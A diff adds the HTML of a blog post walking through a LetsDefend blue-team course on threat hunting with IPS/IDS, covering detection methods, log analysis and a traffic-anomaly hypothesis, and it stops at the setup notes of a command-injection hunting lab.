@@ -1,0 +1,808 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <title>
+  Threat Hunting with IPS/IDS Walkthrough — LetsDefend · Yusuf Arbac
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="Yusuf Arbac">
+<meta name="description" content="
+
+  Threat Hunting with IPS/IDS Walkthrough — LetsDefend
+  
+    
+    Link to heading
+  
+
+
+LetsDefend — Blue Team Training Platform
+
+  Introduction
+  
+    
+    Link to heading
+  
+
+Threat hunting is a proactive cybersecurity strategy. Rather than focusing solely on known threats, security teams hunt for advanced and stealthy attacks that have yet to be detected. Intrusion prevention system (IPS) and intrusion detection system (IDS) technologies play a critical role in this hunting process.">
+<meta name="keywords" content="cybersecurity, infosec, cloud-native security, soc architecture, open source defense, yusuf talha arabaci, malware analysis, pentesting">
+
+
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/images/avatar.png">
+  <meta name="twitter:title" content="Threat Hunting with IPS/IDS Walkthrough — LetsDefend">
+  <meta name="twitter:description" content="Threat Hunting with IPS/IDS Walkthrough — LetsDefendLink to headingLetsDefend — Blue Team Training Platform
+IntroductionLink to headingThreat hunting is a proactive cybersecurity strategy. Rather than focusing solely on known threats, security teams hunt for advanced and stealthy attacks that have yet to be detected. Intrusion prevention system (IPS) and intrusion detection system (IDS) technologies play a critical role in this hunting process.">
+
+<meta property="og:url" content="http://localhost:1313/posts/2025-10-13-threat-hunting-with-ips-ids-walkthrough-letsdefend/">
+  <meta property="og:site_name" content="Yusuf Arbac">
+  <meta property="og:title" content="Threat Hunting with IPS/IDS Walkthrough — LetsDefend">
+  <meta property="og:description" content="Threat Hunting with IPS/IDS Walkthrough — LetsDefendLink to headingLetsDefend — Blue Team Training Platform
+IntroductionLink to headingThreat hunting is a proactive cybersecurity strategy. Rather than focusing solely on known threats, security teams hunt for advanced and stealthy attacks that have yet to be detected. Intrusion prevention system (IPS) and intrusion detection system (IDS) technologies play a critical role in this hunting process.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-10-13T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-10-13T00:00:00+00:00">
+    <meta property="og:image" content="http://localhost:1313/images/avatar.png">
+
+
+
+
+<link rel="canonical" href="http://localhost:1313/posts/2025-10-13-threat-hunting-with-ips-ids-walkthrough-letsdefend/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.css" media="screen">
+
+
+
+
+
+
+
+
+ 
+  
+    
+    <link rel="stylesheet" href="/css/custom.css" media="screen">
+  
+
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+<body class="preload-transitions colorscheme-light">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://localhost:1313/">
+      Yusuf Arbac
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">Posts</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">About Me</a>
+            </li>
+          
+        
+        
+          
+          
+          
+            
+              
+                <li class="navigation-item menu-separator">
+                  <span>|</span>
+                </li>
+                
+              
+              <li class="navigation-item">
+                <a href="/tr/posts/2025-10-13-threat-hunting-with-ips-ids-walkthrough-letsdefend/">Türkçe</a>
+              </li>
+            
+          
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://localhost:1313/posts/2025-10-13-threat-hunting-with-ips-ids-walkthrough-letsdefend/">
+              Threat Hunting with IPS/IDS Walkthrough — LetsDefend
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2025-10-13T00:00:00Z">
+                October 13, 2025
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              13-minute read
+            </span>
+          </div>
+          
+          
+          
+        </div>
+      </header>
+
+      
+
+
+      <div class="post-content">
+        
+        <hr>
+<h3 id="threat-hunting-with-ipsids-walkthroughletsdefend">
+  Threat Hunting with IPS/IDS Walkthrough — LetsDefend
+  <a class="heading-link" href="#threat-hunting-with-ipsids-walkthroughletsdefend">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p><img src="/images/0_0nXXxq60ZsaSHIFC.png" alt=""></p>
+<p><a href="https://letsdefend.io/"  class="external-link" target="_blank" rel="noopener">LetsDefend — Blue Team Training Platform</a></p>
+<h3 id="introduction">
+  Introduction
+  <a class="heading-link" href="#introduction">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>Threat hunting is a proactive cybersecurity strategy. Rather than focusing solely on known threats, security teams hunt for advanced and stealthy attacks that have yet to be detected. Intrusion prevention system (IPS) and intrusion detection system (IDS) technologies play a critical role in this hunting process.</p>
+<ul>
+<li><strong>Intrusion Detection System (IDS)</strong>: IDS is a security technology that monitors network traffic and system events to detect suspicious activities. It typically operates passively, meaning it detects attacks but does not take action. Detected suspicious activities are reported to security teams.</li>
+<li><strong>Intrusion Prevention System (IPS)</strong>: IPS goes a step further than IDS. It monitors network traffic, detects suspicious activities, and takes proactive measures against these threats, including actions such as blocking malicious traffic or terminating sessions.</li>
+</ul>
+<p><img src="/images/0_SG624gNxj5iGFv3k.png" alt=""></p>
+<p>( <strong>Image Source</strong> : <a href="https://www.tops.hk/en/pfsense-firmware-os/ids-ips.html"  class="external-link" target="_blank" rel="noopener">https://www.tops.hk/en/pfsense-firmware-os/ids-ips.html</a> )</p>
+<p>This lesson has provided an introduction to the topic. The next lesson will cover “ <strong>The Role of IPS/IDS in Threat Hunting”</strong> .</p>
+<h3 id="questions">
+  Questions
+  <a class="heading-link" href="#questions">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>No Answer Needed</p>
+<hr>
+<h3 id="the-role-of-ipsids-in-threathunting">
+  The Role of IPS/IDS in Threat Hunting
+  <a class="heading-link" href="#the-role-of-ipsids-in-threathunting">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>In the threat hunting process, security tools or systems such as IPS (Intrusion Prevention System) and IDS (Intrusion Detection System) provide significant support in both detecting existing threats and understanding how these threats operate. The functions that IPS and IDS systems perform in the threat hunting process are as follows:</p>
+<h3 id="incident-detection-and-earlyalerts">
+  Incident Detection and Early Alerts
+  <a class="heading-link" href="#incident-detection-and-earlyalerts">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>IPS/IDS systems continuously monitor network traffic and system behavior, enabling them to detect attackers&rsquo; movements in the early stages. These systems provide cybersecurity teams with initial alerts about potential threats, allowing attackers to be stopped before they can execute their plans. These alerts serve as a starting point for threat hunting processes and identify situations that require deeper investigation. Alerts typically include the following scenarios:</p>
+<ul>
+<li><strong>Suspicious Traffic:</strong> A sudden increase in traffic volume from a specific IP address or system is often a notable event. For example, an internal IP address transferring significantly more data than usual to external systems could indicate data exfiltration or an attack attempt. Such sudden spikes, especially in systems that normally have low traffic volumes, can be a sign of a serious threat.</li>
+<li><strong>Unexpected Connections:</strong> Connections made by devices within the system or network to unexpected IP addresses are among the early indications of cyber attacks. For example, a server on the internal network connecting to a remote IP address it doesn&rsquo;t normally communicate with could indicate backdoor activity or malware. Such situations are common with phishing attacks or the use of remote access tools (RATs).</li>
+<li><strong>Unexpected Data Transfers:</strong> A device or system that does not normally perform certain data flows or transfers suddenly starts sending or receiving large amounts of data could indicate a security breach or data leakage. Such unexpected data transfers, especially connections from critical systems to the outside world, should raise suspicions of malware activity or insider threats. IPS/IDS systems can detect such transfers and provide alerts to identify data theft or malicious activity hidden in encrypted traffic.</li>
+<li><strong>Suspicious Protocols:</strong> The sudden use of rarely or never-used protocols on a particular network segment can be an indication that attackers are using unconventional methods to avoid detection. For example, the sudden appearance of FTP or SSH traffic on a system that normally has only HTTP traffic could indicate that attackers are attempting to steal data or send commands. Such unexpected protocol usage should be immediately detected and alerted by IPS/IDS systems.</li>
+</ul>
+<p>These alerts not only serve as a starting point for threat hunters, but also provide guiding information to help understand the potential target and how the attack was carried out. Detailed analysis of alerts can help understand the attacker&rsquo;s path and prevent potential threats in advance.</p>
+<p><img src="/images/0_jNKLrZsI9seDYJJX.png" alt=""></p>
+<p>( <strong>Image Source</strong> : <a href="https://networkfish.com/it-security/what-is-cyber-threat-hunting/"  class="external-link" target="_blank" rel="noopener">https://networkfish.com/it-security/what-is-cyber-threat-hunting/</a> )</p>
+<h3 id="comprehensive-data-collection">
+  Comprehensive Data Collection
+  <a class="heading-link" href="#comprehensive-data-collection">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>IPS/IDS systems collect and analyze a wide range of data during the threat hunting process. In order to track threats and detail the movements of attackers, this data is critical. The data collected includes:</p>
+<ul>
+<li><strong>Packet Records:</strong> Each data packet on the network is recorded. These records include the data carried by each packet, source and destination IP addresses, protocols used, and payloads. Packet records are particularly useful for investigating suspicious traffic or attack vectors from specific sources. For example, identifying the types of packets heavily used in a DDoS attack provides critical information to mitigate the attack.</li>
+<li><strong>Connection Information:</strong> IPS/IDS systems collect detailed connection logs that show which devices communicate with which servers, when, and how often. This information is essential for detecting deviations from normal behavior and identifying potential threats. For example, an internal server suddenly communicating frequently with different external IP addresses could indicate data leakage or backdoor access.</li>
+<li><strong>Attack Patterns:</strong> Known threat signatures are loaded into IPS/IDS systems, which compare network traffic against these signatures to detect potential attacks. Attack patterns help threat hunters link past attacks to current events. In addition, these signatures can reveal whether previously used methods are being used. For example, detecting a new version of known malware can be achieved by effectively using signatures from past attacks.</li>
+</ul>
+<p>The collected data helps threat hunters determine when an attack began, how it spread, and what systems were targeted. In addition, the attacker&rsquo;s intentions and next steps can be predicted through the correlation analysis of this data.</p>
+<p><img src="/images/0_0-1Ad9LkaBqXNp0i.png" alt=""></p>
+<p>( <strong>Image Source</strong> : <a href="https://www.socinvestigation.com/ids-vs-ips-key-differences-rule-structure-pros-and-cons/"  class="external-link" target="_blank" rel="noopener">https://www.socinvestigation.com/ids-vs-ips-key-differences-rule-structure-pros-and-cons/</a> )</p>
+<h3 id="anomaly-and-signature-based-detection">
+  Anomaly and Signature-Based Detection
+  <a class="heading-link" href="#anomaly-and-signature-based-detection">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>IPS/IDS systems use two main methods to detect threats: signature-based detection and anomaly-based detection. These two methods are used together to identify different types of threats and are critical in the threat hunting process.</p>
+<p><strong>Signature-based Detection:</strong> Signature-based detection relies on known signatures of specific types of attacks. These signatures are created based on data from past attacks or predefined threats. Signature-based detection is particularly effective for quickly identifying common and known attacks. For example, signature-based systems can quickly detect the characteristic traces left in network traffic by known malware. However, this method may be limited against new and previously unseen attacks because such attacks use undefined signatures.</p>
+<p><strong>Anomaly-based Detection:</strong> Anomaly-based detection identifies deviations from normal network behavior and detects potential threats. This approach is especially important for detecting unknown or zero-day attacks. Anomaly detection looks for changes in network behavior at specific times or with specific user activity. For example, a server with normally low traffic suddenly transferring large amounts of data could be flagged as an anomaly and require further investigation. By using continuous learning and advanced analysis techniques, anomaly detection offers a versatile approach to threat hunting.</p>
+<p>Threat hunting often uses these two detection methods together. Signature-based detection provides rapid identification of known threats, enabling immediate response. Anomaly-based detection uncovers unknown threats and provides a broader security perspective. Combined, they enhance security teams&rsquo; ability to detect both known and unknown threats, strengthening cybersecurity defenses.</p>
+<p><img src="/images/0_aNKbrBQ3rebr8wml.png" alt=""></p>
+<p>This lesson discussed the importance of IPS and IDS in the threat hunting process. The next lesson will cover the topic “ <strong>Using IPS/IDS in the Threat Hunting Process</strong> “.</p>
+<h3 id="questions-1">
+  Questions
+  <a class="heading-link" href="#questions-1">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>No Answer Needed</p>
+<hr>
+<h3 id="using-ipsids-in-the-threat-hunting-process">
+  Using IPS/IDS in the Threat Hunting Process
+  <a class="heading-link" href="#using-ipsids-in-the-threat-hunting-process">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>In the threat hunting process, the effective use of Intrusion Prevention System/Intrusion Detection System (IPS/IDS) systems significantly enhances the threat hunter&rsquo;s ability to detect, analyze, and respond to threats. The following content describes how IPS/IDS systems are used in the threat hunting process. This lesson focuses on investigations performed on IPS/IDS systems based on hypotheses developed by threat hunters.</p>
+<h3 id="data-collection-and-loganalysis">
+  Data Collection and Log Analysis
+  <a class="heading-link" href="#data-collection-and-loganalysis">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<h3 id="importance-of-ipsidslogs">
+  Importance of IPS/IDS Logs
+  <a class="heading-link" href="#importance-of-ipsidslogs">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>IPS/IDS systems generate a large amount of network traffic data. This data is critical to identifying potential threats during the threat hunting process.</p>
+<p>Logs contain unusual activity on the network or behavior that matches known attack signatures. These logs serve as a starting point for threat hunters.</p>
+<h3 id="data-collection-process">
+  Data Collection Process
+  <a class="heading-link" href="#data-collection-process">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li><strong>Centralized Logging:</strong> Collecting IPS/IDS logs in a centralized system simplifies analysis and correlation processes.</li>
+<li><strong>Log Formats and Structure:</strong> Understanding the log format, determining where specific information is located, and identifying which information can be used for threat hunting are essential.</li>
+<li><strong>Filtering and Prioritizing Logs:</strong> Filtering and prioritization techniques are used to make sense of the large volume of data in logs, allowing analysts to focus on only critical events.</li>
+</ul>
+<h3 id="analysis-techniques">
+  Analysis Techniques
+  <a class="heading-link" href="#analysis-techniques">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li><strong>Basic Log Analysis:</strong> Simple search and sorting operations on logs to identify anomalies.</li>
+<li><strong>Advanced Log Analysis:</strong> Using specialized software or scripts to create correlations, trend analyses, and behavior models from logs.</li>
+<li><strong>Automated Analysis Tools:</strong> Automatically analyzing logs using machine learning and AI-supported tools to detect potential threats.</li>
+</ul>
+<p><img src="/images/0_777ZXBKz3iNkZ4_X.png" alt=""></p>
+<p>( <strong>Image Source</strong> : <a href="https://www.shiksha.com/online-courses/what-is-data-analysis-st583-tg1135"  class="external-link" target="_blank" rel="noopener">https://www.shiksha.com/online-courses/what-is-data-analysis-st583-tg1135</a> )</p>
+<h3 id="anomaly-detection">
+  Anomaly Detection
+  <a class="heading-link" href="#anomaly-detection">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li><strong>Defining Normal Behavior:</strong> Defining normal traffic and user behavior on the network is necessary for detecting anomalies.</li>
+</ul>
+<h3 id="anomaly-detection-methods">
+  Anomaly Detection Methods
+  <a class="heading-link" href="#anomaly-detection-methods">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li><strong>Statistical Methods:</strong> Statistically analyzing traffic data to define anomalies.</li>
+<li><strong>Machine Learning-Based Methods:</strong> Using supervised and unsupervised learning algorithms for anomaly detection.</li>
+</ul>
+<h3 id="anomaly-detection-andipsids">
+  Anomaly Detection and IPS/IDS
+  <a class="heading-link" href="#anomaly-detection-andipsids">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>Detected anomalous traffic is logged by IPS/IDS systems, and analysis of these logs enables early detection of potential attacks.</p>
+<h3 id="detection-of-attack-indicators">
+  Detection of Attack Indicators
+  <a class="heading-link" href="#detection-of-attack-indicators">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<h3 id="signature-based-detection">
+  Signature-Based Detection
+  <a class="heading-link" href="#signature-based-detection">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>IPS/IDS systems detect and log traffic that matches known attack signatures.</p>
+<ul>
+<li><strong>Updating Signature Databases:</strong> Keeping attack signatures up-to-date is crucial for detecting new threats.</li>
+</ul>
+<h3 id="anomaly-based-attack-detection">
+  Anomaly-Based Attack Detection
+  <a class="heading-link" href="#anomaly-based-attack-detection">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>Often associated with anomaly detection, it is the detection of potential threats that fall outside of known attack signatures.</p>
+<ul>
+<li><strong>Behavioral Analysis:</strong> Monitoring changes in attackers&rsquo; behavior over time and predicting attacks based on these behaviors.</li>
+</ul>
+<h3 id="real-time-analysis">
+  Real-Time Analysis
+  <a class="heading-link" href="#real-time-analysis">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li><strong>Real-Time Traffic Monitoring:</strong> IPS/IDS systems monitor network traffic in real time to detect threats requiring immediate intervention.</li>
+<li><strong>Automatic Alerts:</strong> Threat hunters define automatic alerts for specific events or anomaly detections, enabling quick action.</li>
+<li><strong>Incident Response Procedures:</strong> Establishing and implementing emergency response steps for threats detected in real time.</li>
+</ul>
+<h3 id="retrospective-analysis">
+  Retrospective Analysis
+  <a class="heading-link" href="#retrospective-analysis">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li><strong>Log Archiving:</strong> Archiving IPS/IDS logs for a specific period to allow future analysis.</li>
+<li><strong>Historical Data Review:</strong> Examining past logs to detect previously overlooked threats and understand how attacks evolved.</li>
+<li><strong>Correlation and Trend Analysis:</strong> Performing correlation and trend analysis on logs to determine if events from different time periods are related.</li>
+<li><strong>Retrospective Hypothesis Testing:</strong> Threat hunters test their findings on past logs to determine the starting points of attacks or the techniques used.</li>
+</ul>
+<h3 id="hypothesis-testing-and-validation-with-ipsidssystems">
+  Hypothesis Testing and Validation with IPS/IDS Systems
+  <a class="heading-link" href="#hypothesis-testing-and-validation-with-ipsidssystems">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<h3 id="creating-a-hypothesis">
+  Creating a Hypothesis
+  <a class="heading-link" href="#creating-a-hypothesis">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li><strong>Role of Hypotheses in Threat Hunting:</strong> Threat hunters develop hypotheses to understand attack or threat scenarios.</li>
+<li><strong>Hypothesis Testing with IPS/IDS Systems:</strong> Testing developed hypotheses on IPS/IDS logs to check if the signs and behaviors validate the hypothesis.</li>
+</ul>
+<h3 id="validation-and-reporting">
+  Validation and Reporting
+  <a class="heading-link" href="#validation-and-reporting">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li><strong>Validation Process:</strong> Validating hypotheses using various data sources and analyses.</li>
+<li><strong>Reporting:</strong> Reporting findings from the threat hunting process and sharing them with management and other security teams.</li>
+<li><strong>Action Plans:</strong> Determining and implementing security measures based on validated hypotheses.</li>
+</ul>
+<h3 id="conclusion">
+  Conclusion
+  <a class="heading-link" href="#conclusion">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>This lesson discussed how threat hunters&rsquo; hypotheses are tested on IPS/IDS systems, how data collection and analysis processes are managed, and how actions are taken against detected threats.</p>
+<p>The next lesson will cover the topic “ <strong>Network Traffic Anomaly Hypothesis</strong> “.</p>
+<h3 id="questions-2">
+  Questions
+  <a class="heading-link" href="#questions-2">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>No Answer Needed</p>
+<hr>
+<h3 id="network-traffic-anomaly-hypothesis">
+  Network Traffic Anomaly Hypothesis
+  <a class="heading-link" href="#network-traffic-anomaly-hypothesis">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<h3 id="hypothesis">
+  Hypothesis
+  <a class="heading-link" href="#hypothesis">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>A threat actor may be attempting to distribute malware through web traffic.</p>
+<p><img src="/images/0_jKriBOd5vnLLhGW8.png" alt=""></p>
+<p>( <strong>Image Source</strong> : <a href="https://www.researchgate.net/figure/Network-intrusion-detection-system-with-network-traffic-analysis-26_fig1_353850592"  class="external-link" target="_blank" rel="noopener">https://www.researchgate.net/figure/Network-intrusion-detection-system-with-network-traffic-analysis-26_fig1_353850592</a> )</p>
+<h3 id="data-sources">
+  Data Sources
+  <a class="heading-link" href="#data-sources">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li><strong>IDS/IPS Logs:</strong> Records of abnormal traffic activities and events matching known attack signatures.</li>
+<li><strong>Network Traffic Logs:</strong> Incoming and outgoing network traffic from specific devices.</li>
+<li><strong>Firewall Logs:</strong> Suspicious external connection attempts and blocked network traffic.</li>
+<li><strong>Web Server Logs:</strong> Abnormal or unexpected HTTP requests.</li>
+</ul>
+<h3 id="analysis-steps">
+  Analysis Steps
+  <a class="heading-link" href="#analysis-steps">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<h3 id="idsips-indications">
+  IDS/IPS Indications
+  <a class="heading-link" href="#idsips-indications">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>Examine traffic activities that match known attack signatures.</li>
+<li>Check for deviations from normal behavior patterns in IDS/IPS systems that perform anomaly detection.</li>
+</ul>
+<h3 id="network-trafficanalysis">
+  Network Traffic Analysis
+  <a class="heading-link" href="#network-trafficanalysis">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>Monitor abnormal traffic volume and unexpected connection attempts.</li>
+<li>Analyze unusual traffic originating from or directed to a specific device.</li>
+</ul>
+<h3 id="firewall-alerts">
+  Firewall Alerts
+  <a class="heading-link" href="#firewall-alerts">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>Review blocked external connection attempts and suspicious outbound traffic.</li>
+<li>Investigate significant increases or abnormal port usage in firewall logs.</li>
+</ul>
+<h3 id="log-correlation">
+  Log Correlation
+  <a class="heading-link" href="#log-correlation">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>Combine IDS/IPS, network traffic, and firewall logs to identify abnormal traffic or activities matching known attack signatures.</li>
+<li>Conduct correlation analysis to look for consistent attack indicators across multiple log sources.</li>
+</ul>
+<h3 id="protocol-and-port-analysis">
+  Protocol and Port Analysis
+  <a class="heading-link" href="#protocol-and-port-analysis">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>Monitor unusual traffic over protocols such as SMB, RDP, and HTTP.</li>
+<li>Investigate connections made over suspicious ports.</li>
+</ul>
+<h3 id="time-frameanalysis">
+  Time Frame Analysis
+  <a class="heading-link" href="#time-frameanalysis">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>Identify the time periods during which abnormal activity is concentrated.</li>
+<li>Analyze off-hours activity and traffic changes that match attack signatures.</li>
+</ul>
+<h3 id="expected-outcomes">
+  Expected Outcomes
+  <a class="heading-link" href="#expected-outcomes">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>Detecting known attack signatures and anomalies in IDS/IPS logs.</li>
+<li>Suspicious outbound traffic and blocked connection attempts in firewall logs.</li>
+<li>Unusual traffic spikes from a specific device or group of devices.</li>
+</ul>
+<h3 id="summary">
+  Summary
+  <a class="heading-link" href="#summary">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>In the threat hunting process, IDS/IPS systems play a critical role in detecting abnormal traffic and activity that matches known attack signatures on the network. By following the steps outlined in this lesson, potential threats can be detected earlier. This process helps organizations strengthen their cybersecurity strategies, manage attacks more effectively, and proactively protect network security. When used in the threat hunting process, IDS/IPS systems accelerate the detection of suspicious activity and attacks, enabling organizations to respond more quickly to threats.</p>
+<h3 id="questions-3">
+  Questions
+  <a class="heading-link" href="#questions-3">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>No Answer Needed</p>
+<hr>
+<h3 id="practical-lab">
+  Practical Lab
+  <a class="heading-link" href="#practical-lab">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<h3 id="hypothesis-1">
+  Hypothesis
+  <a class="heading-link" href="#hypothesis-1">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p><strong>Note</strong>: The questions in this section are prepared for Threat Hunting based on the following hypothesis.</p>
+<p><strong>Hypothesis:</strong> Attackers may be attempting to exploit the “OS Command Injection” vulnerability in the organization&rsquo;s web applications to gain unauthorized access to servers and execute malicious commands.</p>
+<h3 id="threat-hunting-lab-environment">
+  Threat Hunting Lab Environment
+  <a class="heading-link" href="#threat-hunting-lab-environment">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>IPS/IDS Events (FortiIPS)</li>
+<li>SIEM (Wazuh)</li>
+<li>EDR Events (Sysmon)</li>
+<li>CTI Events (<a href="https://app.letsdefend.io/threat-intelligence-feed"  class="external-link" target="_blank" rel="noopener">Threat Intel LetsDefend Platform</a>)</li>
+</ul>
+<h3 id="lab-notes">
+  Lab Notes
+  <a class="heading-link" href="#lab-notes">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>Analyze the logs between “Aug 8, 2024 00:00 — Aug 13, 2024 00:00” to answer the questions below.</li>
